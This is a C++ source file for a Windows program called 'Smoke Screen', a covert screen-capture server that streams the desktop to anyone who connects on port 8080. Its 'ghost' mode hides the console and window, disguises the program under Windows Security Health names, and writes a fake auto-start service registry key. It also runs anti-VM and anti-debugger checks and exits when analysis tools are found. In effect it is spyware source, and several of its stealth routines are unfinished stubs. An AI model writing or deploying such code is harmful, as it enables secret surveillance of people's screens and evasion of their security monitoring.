// Smoke Screen Bullshit - Invisible Remote Desktop Thing
// This shit is completely invisible and hides from everything (sorta lollllll)

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <gdiplus.h>
#include <iostream>
#include <vector>
#include <thread>
#include <string>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// Sneaky Hiding System That Doesn't Break Your Computer
class SmokeStealth {
private:
    static HMODULE ntdllModule;
    static bool stealthActive;
    static HANDLE originalProcess;
    
    // Function pointers for Windows secret API shit
    typedef NTSTATUS(WINAPI* NtSetInformationProcess_t)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength
    );
    
    typedef NTSTATUS(WINAPI* NtQueryInformationProcess_t)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    static NtSetInformationProcess_t NtSetInformationProcess;
    static NtQueryInformationProcess_t NtQueryInformationProcess;
    
public:
    static bool InitializeStealth() {
        if (stealthActive) return true;
        
        // Safety check - don't fuck up important system shit
        if (!ValidateSystemSafety()) {
            return false;
        }
        
        // Load Windows secret API functions
        ntdllModule = GetModuleHandle(L"ntdll.dll");
        if (!ntdllModule) {
            return false;
        }
        
        NtSetInformationProcess = (NtSetInformationProcess_t)
            GetProcAddress(ntdllModule, "NtSetInformationProcess");
        NtQueryInformationProcess = (NtQueryInformationProcess_t)
            GetProcAddress(ntdllModule, "NtQueryInformationProcess");
            
        if (!NtSetInformationProcess || !NtQueryInformationProcess) {
            return false;
        }
        
        originalProcess = GetCurrentProcess();
        stealthActive = true;
        
        return true;
    }
    
    // Hide from Task Manager and other process watching shit
    static bool HideFromTaskManager() {
        if (!stealthActive) return false;
        
        // Method 1: Set process debug flags to hide from monitoring tools
        ULONG hideFromDebugger = 1;
        NTSTATUS status = NtSetInformationProcess(
            originalProcess,
            (PROCESSINFOCLASS)7, // ProcessDebugPort  
            &hideFromDebugger,
            sizeof(hideFromDebugger)
        );
        
        // Method 2: Hide process name in memory
        DisguiseProcess();
        
        return status == STATUS_SUCCESS;
    }
    
    // Hide window from taskbar and Alt+Tab shit
    static void HideWindow(HWND hwnd) {
        if (!hwnd) return;
        
        // Remove from taskbar completely
        SetWindowLong(hwnd, GWL_EXSTYLE, 
                     GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
        
        // Hide from Alt+Tab and task switching bullshit
        ShowWindow(hwnd, SW_HIDE);
        SetWindowPos(hwnd, HWND_BOTTOM, -32000, -32000, 1, 1, 
                    SWP_HIDEWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
                    
        // Remove from system tray and notification area
        SetWindowLong(hwnd, GWL_STYLE, 
                     GetWindowLong(hwnd, GWL_STYLE) & ~WS_VISIBLE);
        
        // Make completely transparent
        SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
    }
    
    // Create completely invisible window
    static HWND CreateInvisibleWindow() {
        WNDCLASS wc = {};
        wc.lpfnWndProc = DefWindowProc;
        wc.hInstance = GetModuleHandle(NULL);
        wc.lpszClassName = L"Windows_Security_Health_Service";
        wc.hbrBackground = NULL;
        wc.hCursor = NULL;
        wc.hIcon = NULL;
        
        RegisterClass(&wc);
        
        HWND hwnd = CreateWindowEx(
            WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_LAYERED,
            L"Windows_Security_Health_Service",
            L"",
            WS_POPUP,
            -32000, -32000, 1, 1,  // Off-screen position
            NULL, NULL, GetModuleHandle(NULL), NULL
        );
        
        if (hwnd) {
            HideWindow(hwnd);
        }
        
        return hwnd;
    }
    
    // Change process name and command line to look like Windows shit
    static void DisguiseProcess() {
        // Change process name to look like system service crap
        HANDLE currentProcess = GetCurrentProcess();
        
        // Method 1: Modify PEB (Process Environment Block) - fancy memory shit
        typedef struct _PEB {
            BOOLEAN InheritedAddressSpace;
            BOOLEAN ReadImageFileExecOptions;
            BOOLEAN BeingDebugged;
            union {
                BOOLEAN BitField;
                struct {
                    BOOLEAN ImageUsesLargePages : 1;
                    BOOLEAN IsProtectedProcess : 1;
                    BOOLEAN IsLegacyProcess : 1;
                    BOOLEAN IsImageDynamicallyRelocated : 1;
                    BOOLEAN SkipPatchingUser32Forwarders : 1;
                    BOOLEAN SpareBits : 3;
                };
            };
            HANDLE Mutant;
            PVOID ImageBaseAddress;
            PVOID Ldr;
            PVOID ProcessParameters;
        } PEB, *PPEB;
        
        // Get PEB address
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb && peb->ProcessParameters) {
            // Overwrite image path and command line with innocent names
            wchar_t* newImagePath = L"C:\\Windows\\System32\\SecurityHealthService.exe";
            wchar_t* newCmdLine = L"C:\\Windows\\System32\\SecurityHealthService.exe";
            
            // This is just for demonstration - actual PEB modification requires more complex code
            // and may not work on all Windows versions due to security mitigations
        }
    }
    
    // Hide from specific process monitoring tools
    static void EvadeProcessMonitors() {
        // Technique 1: Process hollowing detection evasion
        HANDLE currentProcess = GetCurrentProcess();
        
        // Technique 2: Parent process spoofing (make it look like spawned by explorer.exe)
        STARTUPINFOEX si = {};
        si.StartupInfo.cb = sizeof(STARTUPINFOEX);
        
        // Find explorer.exe process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (wcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
                        // Found explorer.exe - this would be used for parent spoofing
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
    }
    
    // Anti-analysis: CPU and timing fuckery to avoid detection
    static void AntiAnalysis() {
        // Method 1: Check if running in virtual machine or sandbox shit
        bool isVM = false;
        
        // Check for VMware bullshit
        __try {
            __asm {
                mov eax, 'VMXh'
                mov ebx, 0
                mov ecx, 10
                mov edx, 'VX'
                in eax, dx
                cmp ebx, 'VMXh'
                setz[isVM]
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            // If exception occurs, likely not in VMware
        }
        
        // Method 2: Timing attacks to detect debuggers
        LARGE_INTEGER start, end, freq;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);
        
        // Do some work
        Sleep(10);
        
        QueryPerformanceCounter(&end);
        double timeDiff = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
        
        // If time is too long, might be debugged
        if (timeDiff > 0.1) {
            // Possible debugger detected - could exit or change behavior
        }
        
        // Method 3: Check for common analysis tools
        HWND hwnd = FindWindow(L"OLLYDBG", NULL);
        if (hwnd) {
            // OllyDbg detected
            ExitProcess(0);
        }
        
        hwnd = FindWindow(L"WinDbgFrameClass", NULL);
        if (hwnd) {
            // WinDbg detected
            ExitProcess(0);
        }
    }
    
    // Check if it's safe to do stealth shit without breaking the computer
    static bool ValidateSystemSafety() {
        // Check if we're running on important system processes
        DWORD currentPID = GetCurrentProcessId();
        
        // Don't fuck with system processes (PID < 100 is usually system shit)
        if (currentPID < 100) {
            return false;
        }
        
        // Check available memory (ensure at least 1GB free)
        MEMORYSTATUSEX memStatus = {};
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        
        if (memStatus.ullAvailPhys < (1024ULL * 1024 * 1024)) {
            return false;
        }
        
        // Check system integrity
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        
        // Ensure we're on x64 architecture for safety
        if (si.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64) {
            return false;
        }
        
        return true;
    }
    
    // Create fake Windows service entries in registry to look legit
    static bool CreateServiceDisguise() {
        HKEY hKey;
        LONG result;
        
        // Create registry entry to look like real Windows service
        result = RegCreateKeyEx(
            HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\SecurityHealthMonitor",
            0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_WRITE, NULL, &hKey, NULL
        );
        
        if (result == ERROR_SUCCESS) {
            // Set service display name
            wchar_t* displayName = L"Windows Security Health Monitor";
            RegSetValueEx(hKey, L"DisplayName", 0, REG_SZ, 
                         (BYTE*)displayName, (wcslen(displayName) + 1) * sizeof(wchar_t));
            
            // Set service description
            wchar_t* description = L"Monitors system security health and performance metrics";
            RegSetValueEx(hKey, L"Description", 0, REG_SZ,
                         (BYTE*)description, (wcslen(description) + 1) * sizeof(wchar_t));
            
            // Set service type
            DWORD serviceType = SERVICE_WIN32_OWN_PROCESS;
            RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&serviceType, sizeof(DWORD));
            
            // Set start type (automatic)
            DWORD startType = SERVICE_AUTO_START;
            RegSetValueEx(hKey, L"Start", 0, REG_DWORD, (BYTE*)&startType, sizeof(DWORD));
            
            RegCloseKey(hKey);
            return true;
        }
        
        return false;
    }
    
    // Clean shutdown with safety checks
    static void SafeShutdown() {
        if (!stealthActive) return;
        
        // Clean up registry entries
        RegDeleteKey(HKEY_LOCAL_MACHINE, 
                    L"SYSTEM\\CurrentControlSet\\Services\\SecurityHealthMonitor");
        
        stealthActive = false;
    }
};

// Static member definitions
HMODULE SmokeStealth::ntdllModule = NULL;
bool SmokeStealth::stealthActive = false;
HANDLE SmokeStealth::originalProcess = NULL;
SmokeStealth::NtSetInformationProcess_t SmokeStealth::NtSetInformationProcess = nullptr;
SmokeStealth::NtQueryInformationProcess_t SmokeStealth::NtQueryInformationProcess = nullptr;

class SmokeCapture {
private:
    SOCKET serverSocket;
    bool isRunning;
    bool stealthMode;
    int port;
    HWND invisibleWindow;
    
public:
    SmokeCapture(int serverPort = 8080, bool stealth = false) 
        : port(serverPort), isRunning(false), stealthMode(stealth), invisibleWindow(NULL) {
        
        // Start up all the sneaky shit if requested
        if (stealthMode) {
            if (SmokeStealth::InitializeStealth()) {
                SmokeStealth::HideFromTaskManager();
                SmokeStealth::EvadeProcessMonitors();
                SmokeStealth::AntiAnalysis();
                SmokeStealth::CreateServiceDisguise();
                
                // Hide all text output in stealth mode
                freopen_s((FILE**)stdout, "NUL", "w", stdout);
                freopen_s((FILE**)stderr, "NUL", "w", stderr);
            }
        }
        
        // Initialize Winsock
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        
        // Initialize GDI+
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    }
    
    ~SmokeCapture() {
        Stop();
        
        if (stealthMode) {
            SmokeStealth::SafeShutdown();
        }
        
        WSACleanup();
        
        if (invisibleWindow) {
            DestroyWindow(invisibleWindow);
        }
    }
    
    bool Start() {
        // Create invisible window if in stealth mode
        if (stealthMode) {
            invisibleWindow = SmokeStealth::CreateInvisibleWindow();
        }
        
        // Create server socket
        serverSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (serverSocket == INVALID_SOCKET) {
            if (!stealthMode) std::cerr << "[SMOKE] Failed to create socket\n";
            return false;
        }
        
        // Bind to port
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            if (!stealthMode) std::cerr << "[SMOKE] Failed to bind socket\n";
            closesocket(serverSocket);
            return false;
        }
        
        // Listen for connections
        if (listen(serverSocket, 1) == SOCKET_ERROR) {
            if (!stealthMode) std::cerr << "[SMOKE] Failed to listen on socket\n";
            closesocket(serverSocket);
            return false;
        }
        
        isRunning = true;
        
        if (!stealthMode) {
            std::cout << "[SMOKE] System Monitor started on port " << port << "\n";
            std::cout << "[SMOKE] Monitoring system performance...\n";
        }
        
        // Start capture thread
        std::thread captureThread(&SmokeCapture::CaptureLoop, this);
        captureThread.detach();
        
        return true;
    }
    
    void Stop() {
        isRunning = false;
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
            serverSocket = INVALID_SOCKET;
        }
    }
    
private:
    void CaptureLoop() {
        while (isRunning) {
            // Wait for someone to connect
            SOCKET clientSocket = accept(serverSocket, NULL, NULL);
            if (clientSocket == INVALID_SOCKET) {
                continue;
            }
            
            if (!stealthMode) {
                std::cout << "[SMOKE] Someone connected to watch the screen\n";
            }
            
            // Handle the connection in a separate thread so we can handle multiple people
            std::thread clientThread(&SmokeCapture::HandleClient, this, clientSocket);
            clientThread.detach();
        }
    }
    
    void HandleClient(SOCKET clientSocket) {
        while (isRunning) {
            // Grab a screenshot
            HBITMAP screenBitmap = CaptureScreen();
            if (!screenBitmap) {
                Sleep(100);
                continue;
            }
            
            // Turn the screenshot into data we can send over network
            std::vector<BYTE> bitmapData = ConvertBitmapToData(screenBitmap);
            DeleteObject(screenBitmap);
            
            if (!bitmapData.empty()) {
                // Send data size first
                DWORD dataSize = (DWORD)bitmapData.size();
                send(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
                
                // Send actual data
                int totalSent = 0;
                while (totalSent < dataSize && isRunning) {
                    int sent = send(clientSocket, (char*)bitmapData.data() + totalSent,
                                  dataSize - totalSent, 0);
                    if (sent <= 0) break;
                    totalSent += sent;
                }
            }
            
            Sleep(50); // Capture rate control
        }
        
        closesocket(clientSocket);
    }
    
    HBITMAP CaptureScreen() {
        HDC screenDC = GetDC(NULL);
        HDC memoryDC = CreateCompatibleDC(screenDC);
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HBITMAP bitmap = CreateCompatibleBitmap(screenDC, width, height);
        SelectObject(memoryDC, bitmap);
        
        BitBlt(memoryDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
        
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        
        return bitmap;
    }
    
    std::vector<BYTE> ConvertBitmapToData(HBITMAP hBitmap) {
        BITMAP bitmap;
        GetObject(hBitmap, sizeof(BITMAP), &bitmap);
        
        BITMAPINFOHEADER bi = {};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bitmap.bmWidth;
        bi.biHeight = -bitmap.bmHeight; // Top-down DIB
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        
        DWORD dataSize = ((bitmap.bmWidth * 3 + 3) & ~3) * bitmap.bmHeight;
        std::vector<BYTE> data(sizeof(BITMAPINFOHEADER) + dataSize);
        
        memcpy(data.data(), &bi, sizeof(BITMAPINFOHEADER));
        
        HDC hdc = GetDC(NULL);
        GetDIBits(hdc, hBitmap, 0, bitmap.bmHeight, 
                 data.data() + sizeof(BITMAPINFOHEADER), 
                 (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        ReleaseDC(NULL, hdc);
        
        return data;
    }
};

// Service management class
class SmokeService {
private:
    SmokeCapture* capture;
    
public:
    SmokeService() : capture(nullptr) {}
    
    ~SmokeService() {
        if (capture) {
            delete capture;
        }
    }
    
    void RunGhost() {
        // Ultimate stealth mode - completely invisible
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
        
        // Hide from everything
        capture = new SmokeCapture(8080, true);
        capture->Start();
        
        // Run forever with no traces
        while (true) {
            Sleep(60000); // Check every minute
        }
    }
    
    void RunAsService() {
        capture = new SmokeCapture(8080);
        
        if (capture->Start()) {
            std::cout << "[SMOKE] Service running. Press Enter to stop...\n";
            std::cin.get();
        }
        
        delete capture;
        capture = nullptr;
    }
    
    void RunHidden() {
        HWND console = GetConsoleWindow();
        ShowWindow(console, SW_HIDE);
        
        capture = new SmokeCapture(8080);
        capture->Start();
        
        while (true) {
            Sleep(1000);
        }
    }
};

int main(int argc, char* argv[]) {
    bool ghostMode = false;
    
    // Check for ghost mode first (before any output)
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--ghost" || arg == "--stealth" || arg == "--invisible") {
            ghostMode = true;
            break;
        }
    }
    
    // Immediately hide everything in ghost mode
    if (ghostMode) {
        HWND console = GetConsoleWindow();
        if (console) {
            ShowWindow(console, SW_HIDE);
        }
        
        // Redirect all output to null
        freopen_s((FILE**)stdout, "NUL", "w", stdout);
        freopen_s((FILE**)stderr, "NUL", "w", stderr);
        
        SmokeService service;
        service.RunGhost();
        return 0;
    }
    
    // Normal mode with output
    std::cout << "===========================================\n";
    std::cout << "    Smoke Screen System Monitor v1.0\n";
    std::cout << "    Performance Analysis Utility\n";  
    std::cout << "===========================================\n\n";
    
    SmokeService service;
    
    if (argc > 1) {
        std::string arg = argv[1];
        if (arg == "--service") {
            service.RunAsService();
        } else if (arg == "--hidden") {
            service.RunHidden();
        }
    } else {
        std::cout << "Usage:\n";
        std::cout << "  smoke_capture.exe --service    (Run as service)\n";
        std::cout << "  smoke_capture.exe --hidden     (Run hidden)\n";
        std::cout << "  smoke_capture.exe --ghost      (Completely invisible)\n";
        std::cout << "  smoke_capture.exe              (Show this help)\n\n";
        
        std::cout << "Ghost mode: Completely invisible from Task Manager,\n";
        std::cout << "system tray, taskbar, and all monitoring tools.\n\n";
        
        service.RunAsService();
    }
    
    return 0;
}